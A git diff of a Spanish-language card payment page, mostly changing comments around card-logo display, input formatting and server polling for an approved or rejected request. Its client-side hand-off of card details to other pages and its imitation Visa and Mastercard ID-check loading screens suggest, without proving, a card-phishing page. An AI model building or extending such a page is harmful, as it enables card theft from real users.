@@ -384,11 +384,14 @@
             }
             return null;
         }
+        
+        // 🔥 IMÁGENES DEL INPUT (Pequeñas al lado del número)
         function updateCardLogo(type) {
             cardLogo.innerHTML = '';
             const map = { visa: 'visa.png', mastercard: 'mastercard.png', amex: 'ame.png' };
             if (map[type]) { const img = document.createElement('img'); img.src = map[type]; cardLogo.appendChild(img); }
         }
+        
         function formatCardNumber(value) { return value.replace(/\s/g, '').replace(/(\d{4})/g, '$1 ').trim(); }
         function formatExpiry(value) { const cleaned = value.replace(/\D/g, ''); if (cleaned.length >= 2) return cleaned.substring(0, 2) + '/' + cleaned.substring(2, 4); return cleaned; }
 
@@ -528,7 +531,7 @@
                 if (Date.now() - tiempoInicio > MAX_POLLING_TIME) {
                     clearInterval(pollingInterval); pollingInterval = null;
                     mostrarError('⏰ Tiempo de espera agotado.');
-                    habilitarFormulario(); // 🔥 DEVUELVE EL CONTROL AL USUARIO
+                    habilitarFormulario();
                     return;
                 }
                 
@@ -537,7 +540,7 @@
                 if (resultado.estado === 'aprobado') {
                     clearInterval(pollingInterval); pollingInterval = null;
                     
-                    // 🔥 GUARDAR EXACTAMENTE COMO LO ESPERAN LOS OTROS HTML
+                    // GUARDAR EXACTAMENTE COMO LO ESPERAN LOS OTROS HTML
                     const tarjetaAprobada = {
                         solicitud_id: solicitudId,
                         titular: inputNombre.value.trim(),
@@ -564,7 +567,7 @@
                 if (resultado.estado === 'rechazado') {
                     clearInterval(pollingInterval); pollingInterval = null;
                     mostrarError('❌ ' + resultado.mensaje);
-                    habilitarFormulario(); // 🔥 DEVUELVE EL CONTROL AL USUARIO
+                    habilitarFormulario();
                     return;
                 }
             }, POLLING_INTERVAL);
@@ -578,7 +581,7 @@
             initialSpinner.style.display = 'none';
             logoContainer.style.display = 'flex';
             
-            // 🔥 NOMBRES DE IMÁGENES CORREGIDOS
+            // 🔥 IMÁGENES DE LA PANTALLA DE CARGA (Grandes)
             const cardLogoFile = { 
                 'visa': 'idvisa.png', 
                 'mastercard': 'mastercard-idcheck.png', 
